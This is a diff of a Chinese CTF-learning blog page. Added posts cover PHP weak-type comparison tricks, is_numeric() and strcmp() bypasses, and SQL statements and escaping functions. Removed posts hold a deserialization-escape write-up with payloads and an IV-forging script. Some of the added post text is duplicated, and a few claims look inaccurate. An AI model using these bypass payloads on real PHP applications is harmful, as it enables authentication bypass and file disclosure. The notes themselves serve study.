@@ -172,6 +172,240 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-php弱类型及strcmp()函数漏洞及is_numeric()函数漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%8F%8Astrcmp()%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E5%8F%8Ais_numeric()%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%8F%8Astrcmp()%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E5%8F%8Ais_numeric()%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/">
+        php弱类型及strcmp()函数漏洞及is_numeric()函数漏洞
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="php弱类型"><a href="#php弱类型" class="headerlink" title="php弱类型"></a>php弱类型</h1><p>当一个字符串被当作是一个数值进行比较时，如果字符串中不含有“.”、”e“、”E“、”x“，而且数值在整型的范围内的，则这个字符串以int方式取值，且取最前面的字符前的数字，如果最前面的字符前没有数字，则返回为0。其它情况都以float的形式取值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">var_dump(&quot;admin1&quot;==0);</span><br><span class="line">var_dump(&quot;1admin&quot;==1);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果字符串里有e或E，则被当作科学计数法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">var_dump(&quot;1e2&quot;==&quot;100&quot;);</span><br><span class="line">var_dump(&quot;1E2&quot;==&quot;100&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>如果字符串里有x，则被当作为16进制数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&quot;0x01&quot;==&quot;1&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>如果字符串里有.，则字符串以float的方式输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&quot;0.01&quot;==0.01);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="is-numeric-函数"><a href="#is-numeric-函数" class="headerlink" title="is_numeric()函数"></a>is_numeric()函数</h1><p>is_numeric()函数是判断是否是数值或纯数值的字符串，是返回1，不是返回0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(is_numeric(&quot;400&quot;));</span><br><span class="line">var_dump(is_numeric(400));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>is_numeric()函数的漏洞：在输入的数值后加%00或%20，就可以绕过,而%20只适用于纯数字字符串，且要放在后面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(is_numeric(&quot;400%00&quot;));</span><br><span class="line">var_dump(is_numeric(400%20));</span><br><span class="line">var_dump(is_numeric(&quot;400%20&quot;));</span><br><span class="line">var_dump(is_numeric(400%00));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="strcmp-函数"><a href="#strcmp-函数" class="headerlink" title="strcmp()函数"></a>strcmp()函数</h1><p>strcmp()函数用来作为字符串的比较：</p>
+<p>两个字符串相等，返回0</p>
+<p>str1&lt;str2，返回&lt;0的数</p>
+<p>str1&gt;str2，返回&gt;0的数</p>
+<p>strcmp()函数的漏洞：# php弱类型</p>
+<p>当一个字符串被当作是一个数值进行比较时，如果字符串中不含有“.”、”e“、”E“、”x“，而且数值在整型的范围内的，则这个字符串以int方式取值，且取最前面的字符前的数字，如果最前面的字符前没有数字，则返回为0。其它情况都以float的形式取值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">var_dump(&quot;admin1&quot;==0);</span><br><span class="line">var_dump(&quot;1admin&quot;==1);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果字符串里有e或E，则被当作科学计数法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">var_dump(&quot;1e2&quot;==&quot;100&quot;);</span><br><span class="line">var_dump(&quot;1E2&quot;==&quot;100&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>如果字符串里有x，则被当作为16进制数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&quot;0x01&quot;==&quot;1&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>如果字符串里有.，则字符串以float的方式输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&quot;0.01&quot;==0.01);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="is-numeric-函数-1"><a href="#is-numeric-函数-1" class="headerlink" title="is_numeric()函数"></a>is_numeric()函数</h1><p>is_numeric()函数是判断是否是数值或纯数值的字符串，是返回1，不是返回0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(is_numeric(&quot;400&quot;));</span><br><span class="line">var_dump(is_numeric(400));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>is_numeric()函数的漏洞：在输入的数值后加%00或%20，就可以绕过,而%20只适用于纯数字字符串，且要放在后面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(is_numeric(&quot;400%00&quot;));</span><br><span class="line">var_dump(is_numeric(400%20));</span><br><span class="line">var_dump(is_numeric(&quot;400%20&quot;));</span><br><span class="line">var_dump(is_numeric(400%00));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="strcmp-函数-1"><a href="#strcmp-函数-1" class="headerlink" title="strcmp()函数"></a>strcmp()函数</h1><p>strcmp()函数用来作为字符串的比较：</p>
+<p>两个字符串相等，返回0</p>
+<p>str1&lt;str2，返回&lt;0的数</p>
+<p>str1&gt;str2，返回&gt;0的数</p>
+<p>strcmp()函数的漏洞：比较的两个不是字符串会报错，且会返回0，所以可以构造数组或object绕过(适用于php5版本）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo strcmp($_GET[&#x27;ret&#x27;],&#x27;wer&#x27;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">```比较的两个不是字符串会报错，且会返回0，所以可以构造数组或object绕过(适用于php5版本）</span><br></pre></td></tr></table></figure>
+<?php
+
+echo strcmp($_GET['ret'],'wer');
+
+?>
+<p>```</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php%E7%89%B9%E6%80%A7/" rel="tag">php特性</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-sql增删改函数" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/sql%E5%A2%9E%E5%88%A0%E6%94%B9%E5%87%BD%E6%95%B0/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/sql%E5%A2%9E%E5%88%A0%E6%94%B9%E5%87%BD%E6%95%B0/">
+        sql增删改函数
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="在数据库中增加一段数据"><a href="#在数据库中增加一段数据" class="headerlink" title="在数据库中增加一段数据"></a>在数据库中增加一段数据</h1><h2 id="insert语句"><a href="#insert语句" class="headerlink" title="insert语句"></a>insert语句</h2><ol>
+<li>在标准的sql语句中，一次插入一条记录的insert语句的一种形式<br> insert into tablename(列名…) values(列值…）;<br> 这种方法将列表和列值分开了，使用时列表和列值的数必须一致，如下面向user表中插入一段数据<br> insert into user(id,name,age) value(123,’绕’,19);</li>
+<li>在mysql中还有另一种形式<br> insert into user set column_name1=value1,column_name2=value2,….;<br> 这种方法允许将列表和列值成对的出现和使用，如：<br> insert into user set id=123,name=’绕’,age=18;</li>
+<li>前面两种方法的不同点:<br>(1)第一种方法如果value中什么都不写，则表示mysql将使用表中的每一列的默认值插入新纪录，如：<pre><code>                                               insert into user() value()
+如果表名后面什么都不写，即表示向表中所有字段赋值，此时不仅在values中的值与列数一
+致，且顺序不能颠倒。如：
+                                                 列数为3列
+                                                  insert into user value(123,&#39;绕&#39;);错
+                                                  insert into user value(123,&#39;绕&#39;,19);对
+</code></pre>
+(2)第二种方法使用了set方式，必须至少为一列赋值。如果一个字段使用了省缺值（如默认或自增值）<pre><code>，这两种方法都可以省略这些字段。如：
+                                                   id字段使用了自增值
+                                                   insert into user(name,age) value(ni,19);
+                                                   insert into user set name=ni,age=19;
+</code></pre>
+</li>
+</ol>
+<h1 id="删除函数"><a href="#删除函数" class="headerlink" title="删除函数"></a>删除函数</h1><h2 id="删数据"><a href="#删数据" class="headerlink" title="删数据"></a>删数据</h2><ol>
+<li>delete from 表名；</li>
+<li>有条件的删除数据：delete from 表名 where id=1;</li>
+</ol>
+<h2 id="删除结构"><a href="#删除结构" class="headerlink" title="删除结构"></a>删除结构</h2><ol>
+<li>删数据库：drop database 数据库名</li>
+<li>删除表：drop table 表名</li>
+<li>删除表中的列：alter table 表名 drop column 列名<br>如：delete from user where id=16</li>
+</ol>
+<h1 id="修改函数"><a href="#修改函数" class="headerlink" title="修改函数"></a>修改函数</h1><ol>
+<li>修改所有：updata 表名 set 列名=’新的值，非数字加单引号’</li>
+<li>带条件的修改：updata 表名 set 列名=’新的值，非数字加单引号’<br> 如：updata user set username=’tt’ where id=15</li>
+</ol>
+<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h2><ol>
+<li>addslashes()函数返回在预定义字符之前添加反斜杠的字符串<br> 预定字符:<pre><code>           单引号(&#39;)
+           双引号(&quot;)
+           反斜杠(\)
+           NULL
+</code></pre>
+</li>
+<li>该函数用于为存储在数据中的字符串以及数据库查询语句准备字符串</li>
+<li>默认地，php对所有get和post和cookie数据进行自动查询addslashes()。所以你不要对已转义的字符串再用addslashes()，这会造成双层转义。可以用get_magic_quotes_gpc()来检测</li>
+<li>语法：addslashes(string)  string为要转义的字符串</li>
+</ol>
+<h2 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes()"></a>stripslashes()</h2><p>函数删除由addslashes()函数添加的反斜杠</p>
+<h2 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h2><ol>
+<li>函数转义sql语句中使用字符串中的特殊字符<pre><code>     特殊字符：
+                   \x00
+                   \n
+                   \r
+                   \
+                   &#39;
+                   &quot;
+                   \x1a
+</code></pre>
+</li>
+<li>语法：mysql_real_escape_string(string,connection)<pre><code>      string为转义字符串
+      connection 可选。规定mysql连接，未规定，则用上一个连接
+</code></pre>
+</li>
+</ol>
+<h2 id="ctype-digit"><a href="#ctype-digit" class="headerlink" title="ctype_digit()"></a>ctype_digit()</h2><p>检查字符串里的字符是不是数字，是返回ture，不是返回false</p>
+<h2 id="get-magic-quotes-gpc"><a href="#get-magic-quotes-gpc" class="headerlink" title="get_magic_quotes_gpc()"></a>get_magic_quotes_gpc()</h2><ol>
+<li>magic_quotes_gpc=on时，函数magic_quotes_gpc()返回1<br>magic-quotes_gpc=off时，函数magic_quotes_gpc()返回0</li>
+<li>get_magic-quotes-gpc就是得到环境变量magic_quotes_gpc的值</li>
+</ol>
+<h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><p>用于获取变量的整数值</p>
+<h2 id="mysql-fetch-array"><a href="#mysql-fetch-array" class="headerlink" title="mysql_fetch_array"></a>mysql_fetch_array</h2><p>从结果中取出一行作为关联数组</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-php数据类型" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -789,135 +1023,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-安洵杯2019serilaze" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/%E5%AE%89%E6%B4%B5%E6%9D%AF2019serilaze/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/%E5%AE%89%E6%B4%B5%E6%9D%AF2019serilaze/">
-        安洵杯2019serilaze
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="安洵杯 2019]easy_serialize_php"></a>安洵杯 2019]easy_serialize_php</h1><p>代码审计</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function = @$_GET[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);</span><br><span class="line">&#125; #对$img里面的php,flag,php5,php4,fl1g进行过滤</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125; #将已有的session删除掉</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function; #给名为user和function的session赋值</span><br><span class="line"></span><br><span class="line">extract($_POST); #用POST提交的方式叫html表单</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">    echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#x27;img_path&#x27;])&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));</span><br><span class="line">&#125; #如果没有img_path这个变量，则给guset_img.png加密，有，则给img_path加密</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION)); #将$_SESSION序列化的值给filter过滤</span><br><span class="line"></span><br><span class="line">if($function == &#x27;highlight_file&#x27;)&#123;</span><br><span class="line">    highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">&#125; #如果变量是highlight_file，则显示index.php</span><br><span class="line">else if($function == &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!</span><br><span class="line">&#125; #如果变量是phpinfo，则显示php信息</span><br><span class="line">else if($function == &#x27;show_image&#x27;)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;])); #如果变量是show_image，则显示$img变量里的文件里的内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>通过观察php的信息，可以看到一个文件信息d0g3_flag.php</p>
-<p>但是我们无法读取这个文件的内容，然后通过代码审计，我们可以使用反序列化逃逸，通过改变img的值来读取</p>
-<p>可以通过exp来知道原来_SESSION序列化的值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function=@$_GET[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;]=&#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;]=$function;</span><br><span class="line">$_SESSION[&#x27;img&#x27;]=base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">$serialize_info=serialize($_SESSION);</span><br><span class="line"></span><br><span class="line">echo $serialize_info;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>此时输出的是：<br>a:3:{s:4:”user”;s:5:”guest”;s:8:”function”;N;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;}</p>
-<p>我们可以通过减少关键词的数来逃逸<br>_SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}</p>
-<p>我们可以得到<br>$flag = ‘flag in /d0g3_fllllllag’;</p>
-<p>然后我们再改变一下img的数值<br>_SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;}</p>
-<p>从而得到flag<br>flag{7b704900-c0d7-4302-90a6-fc459a2c405c} </p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-对iv进行修复" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/%E5%AF%B9iv%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/%E5%AF%B9iv%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D/">
-        对iv进行修复
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="对iv进行修复"><a href="#对iv进行修复" class="headerlink" title="对iv进行修复"></a>对iv进行修复</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">cipher=&#x27; &#x27;  #提交后所得的无法反序列化密文</span><br><span class="line">iv=&#x27; &#x27;  #一开始提交的iv</span><br><span class="line">cipher=urllib.unquote(cipher)</span><br><span class="line">cipher=base64.b64decode(urllib.unquote(iv))</span><br><span class="line">newIv=&#x27; &#x27;</span><br><span class="line">right=&#x27;a:2:&#123;s:8:&quot;userna&#x27;  #被损坏前的正确明文</span><br><span class="line"></span><br><span class="line">for i in range(16):</span><br><span class="line">	newIv+=chr(ord(right[i])^ord(iv[i])^ord(cipher[i]))  #这一步相当于把原来iv不匹配的部分修改过来</span><br><span class="line">print urllib.quote(base64.b64encode(newIv))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a></li></ul>
 	</div>
 
       
